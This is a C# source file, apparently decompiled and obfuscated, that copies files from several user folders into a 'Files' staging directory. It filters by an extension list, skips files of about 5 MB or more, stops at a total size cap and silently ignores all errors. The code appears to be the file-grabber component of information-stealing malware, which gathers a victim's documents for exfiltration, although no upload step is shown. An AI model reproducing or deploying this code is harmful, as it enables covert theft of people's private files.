using System;
using System.Collections.Generic;
using System.IO;

public class GClass14
{
	public static int int_0;

	public static void smethod_0()
	{
		try
		{
			string text = Class38.string_11 + "\\Files";
			Directory.CreateDirectory(text);
			if (!Directory.Exists(text))
			{
				smethod_0();
				return;
			}
			smethod_2(Class38.string_0, text, "*.*", Class73.int_0);
			smethod_2(Class38.string_5, text, "*.*", Class73.int_0);
			smethod_2(Class38.string_6 + "\\source", text, "*.*", Class73.int_0);
		}
		catch
		{
		}
	}

	private static long smethod_1(string string_0, long long_0 = 0L)
	{
		try
		{
			foreach (string item in Directory.EnumerateFiles(string_0))
			{
				try
				{
					long_0 += new FileInfo(item).Length;
				}
				catch
				{
				}
			}
			foreach (string item2 in Directory.EnumerateDirectories(string_0))
			{
				try
				{
					long_0 += smethod_1(item2);
				}
				catch
				{
				}
			}
			return long_0;
		}
		catch
		{
			return long_0;
		}
	}

	public static void smethod_2(string string_0, string string_1, string string_2, long long_0)
	{
		Stack<GClass15.GClass16> stack = new Stack<GClass15.GClass16>();
		stack.Push(new GClass15.GClass16(string_0, string_1));
		long num = smethod_1(string_1);
		while (stack.Count > 0)
		{
			GClass15.GClass16 gClass = stack.Pop();
			try
			{
				Directory.CreateDirectory(gClass.Target);
				foreach (string item in Directory.EnumerateFiles(gClass.Source, string_2))
				{
					try
					{
						if (Array.IndexOf(Class73.string_2, Path.GetExtension(item)!.ToLower()) < 0)
						{
							continue;
						}
						string text = Path.Combine(gClass.Target, Path.GetFileName(item));
						if (new FileInfo(item).Length / 1024L < 5000L)
						{
							File.Copy(item, text);
							num += new FileInfo(text).Length;
							if (num > long_0)
							{
								return;
							}
							int_0++;
						}
					}
					catch
					{
					}
				}
			}
			catch (UnauthorizedAccessException)
			{
				continue;
			}
			catch (PathTooLongException)
			{
				continue;
			}
			try
			{
				foreach (string item2 in Directory.EnumerateDirectories(gClass.Source))
				{
					try
					{
						if (!item2.Contains(Path.Combine(Class38.string_0, Environment.UserName)))
						{
							stack.Push(new GClass15.GClass16(item2, Path.Combine(gClass.Target, Path.GetFileName(item2))));
						}
					}
					catch
					{
					}
				}
			}
			catch (UnauthorizedAccessException)
			{
			}
			catch (DirectoryNotFoundException)
			{
			}
			catch (PathTooLongException)
			{
			}
		}
		stack.Clear();
	}
}
